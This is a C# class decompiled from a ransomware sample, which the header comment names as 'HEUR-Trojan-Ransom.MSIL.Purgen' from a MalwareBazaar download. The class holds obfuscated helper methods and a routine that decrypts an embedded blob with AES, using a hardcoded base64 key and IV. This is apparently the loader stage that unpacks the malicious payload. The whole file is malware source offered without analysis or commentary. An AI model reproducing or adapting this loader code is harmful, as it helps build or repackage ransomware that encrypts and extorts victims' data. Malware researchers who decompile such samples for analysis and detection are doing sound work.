// Decompiled with JetBrains decompiler
// Type: ADB43ED11.ABEEB6587
// Assembly: ADB43ED11, Version=9.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed
// MVID: 607E95F7-8559-4986-90F9-68784B884761
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.12-msil\HEUR-Trojan-Ransom.MSIL.Purgen.gen-37ff5b1492fe4e1083bdc87df3524d4ac7b5b604e71dfca3730a6527d3bb7d2a.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace ADB43ED11
{
  internal static class ABEEB6587
  {
    internal static byte[] D8672069A(this MemoryStream B942F81E7) => B942F81E7.ToArray();

    internal static void EB73DE3F1(this MemoryStream C7048E7C3, string ED2119997)
    {
      byte num = ED2119997.E7A7B1EB3().E6465B2C0();
      C7048E7C3.WriteByte(num);
    }

    internal static int E7A7B1EB3(this string B9A0C5AA5) => Convert.ToInt32(B9A0C5AA5);

    internal static byte E6465B2C0(this int B7D5A18A7) => Convert.ToByte(B7D5A18A7);

    [CompilerGenerated]
    internal static byte[] \u003CABE\u003E__B1B(this uint[] E16B4225C)
    {
      byte[] numArray = new byte[E16B4225C.Length * 4];
      for (int index1 = 0; index1 < E16B4225C.Length; ++index1)
      {
        byte[] bytes = BitConverter.GetBytes(E16B4225C[index1]);
        for (int index2 = 0; index2 < bytes.Length; ++index2)
          numArray[index1 * 4 + index2] = bytes[index2];
      }
      return numArray;
    }

    [CompilerGenerated]
    internal static byte[] \u003CABE\u003E__BFE(this byte[] A257056EC)
    {
      byte[] numArray1 = Convert.FromBase64String("pN0qLlHb1RTVRh5TT8NDP8nWk9T0RuAa/EdN1nr1FWw=");
      byte[] numArray2 = Convert.FromBase64String("ddjoKd3fLNIGgSsdNKQauA==");
      byte[] array;
      using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
      {
        rijndaelManaged.KeySize = numArray1.Length * 8;
        rijndaelManaged.Key = numArray1;
        rijndaelManaged.BlockSize = numArray2.Length * 8;
        rijndaelManaged.IV = numArray2;
        using (ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor())
        {
          using (MemoryStream memoryStream = new MemoryStream(A257056EC))
          {
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read))
            {
              byte[] numArray3 = new byte[A257056EC.Length];
              int count = cryptoStream.Read(numArray3, 0, A257056EC.Length);
              array = ((IEnumerable<byte>) numArray3).Take<byte>(count).ToArray<byte>();
            }
          }
        }
      }
      return array;
    }
  }
}
